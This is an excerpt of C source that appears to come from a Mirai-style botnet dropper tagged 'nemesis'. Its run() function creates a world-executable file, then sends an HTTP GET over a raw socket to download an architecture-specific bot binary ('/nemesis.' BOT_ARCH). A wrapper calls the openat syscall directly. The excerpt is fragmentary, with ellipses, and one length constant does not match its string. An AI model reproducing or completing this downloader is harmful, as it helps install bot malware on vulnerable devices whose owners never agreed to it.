...
#define EXEC_MSG            "NEMESIS\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "GHOST\n"
...
void run(void)
{
    ...
    ffd = open(FN_BINARY, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /nemesis." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
...
int xopen(char *path, int flags, int other)
{
    return syscall(SCN(SYS_openat), path, flags, other);
}
#endif
